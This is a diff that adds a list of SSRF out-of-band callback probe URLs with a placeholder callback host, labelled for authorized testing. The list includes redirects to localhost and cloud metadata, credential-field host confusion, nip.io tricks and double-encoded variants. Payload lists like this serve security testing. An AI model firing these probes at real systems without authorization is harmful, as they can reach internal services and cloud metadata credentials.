@@ -1,0 +1,16 @@
+# Gated SSRF OOB callback probes - replace callback host in authorized tests
+http://{callback_host}/ssrf
+https://{callback_host}/ssrf
+http://{callback_host}/ssrf?u=127.0.0.1
+http://{callback_host}/dns/a
+http://{callback_host}/redirect-to-localhost
+http://{callback_host}/redirect-to-metadata
+http://127.0.0.1@{callback_host}/
+http://{callback_host}@127.0.0.1/
+http://{callback_host}.127.0.0.1.nip.io/
+http://127.0.0.1.{callback_host}/
+http://{callback_host}/%2f%2f127.0.0.1%2f
+http%3A%2F%2F{callback_host}%2Fssrf
+http%253A%252F%252F{callback_host}%252Fssrf
+http://{callback_host}/cb#http://127.0.0.1/
+http://{callback_host}/cb?next=http://127.0.0.1/
